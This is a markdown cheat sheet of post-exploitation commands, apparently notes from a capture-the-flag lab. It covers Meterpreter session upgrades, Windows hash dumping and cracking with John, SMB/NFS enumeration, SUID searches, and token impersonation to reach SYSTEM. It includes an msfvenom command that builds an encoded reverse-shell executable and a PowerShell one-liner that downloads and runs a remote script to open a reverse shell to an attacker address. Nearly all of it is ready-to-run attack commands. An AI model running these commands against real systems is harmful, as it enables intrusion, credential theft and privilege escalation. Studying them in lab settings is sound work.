# Some useful commands for enumeration
First list all your sessions
```console
sessions 
```
Select the session that you wanna upgrade to meterpreter and run:
```console
session -u <number>
```
Another option is to use
```console
use post/multi/manage/shell_to_meterpreter
```

To choose get into the meterpreter session:
```console
sessions -i 2
```
Tip migration to spoolsv.exe (print service) is always advisable (due to stability)

To dump the hashes of Windows using the Meterpreter:
```console
hashdump
```

To crack the hash use:
```console
john john_hash --format=NT --wordlist=/usr/share/wordlist/rockyou.txt
```

To showed the cracked result:
```console
john john_hash --format=NT --show
```

To enumerate smb shares:
```console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target_ip>
```

To enumerate file system:
```console
nmap -p <number> --script=nfs-ls,nfs-statfs,nfs-showmount <target_ip>
```

# SSH commands
To login with a particular private key
```console
ssh -i id_rsa <username>@<target_ip>
```

# Search commands
To look for SUID (suid) bits enable:
```console
find / -perm -u=s -type f 2>/dev/null
```

# Upgrade shell to meterpreter
```console
search multi/manage/shell_to_meterpreter
```

# Load and run powershell in meterpreter
```console
load powershell
powershell_shell
```

# To create a msfvenoms payload with meterpreter reverse shell
```console
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.146.199 LPORT=4444 -f exe -o alfred.exe
```

# To download using powershell
```console
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.146.199:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.146.199 -Port 4343
```

# To see privilege information in windows
```console
whoami /priv
```

# To impersonate other tokens using meterpreter
```console
load incognito
list_tokens -g
```

# To become NT system
```console
impersonate_token "BUILTIN\Administrators"
then migrate to a SYSTEM process (usually services.exe)
migrate <PID of services.exe>          
```
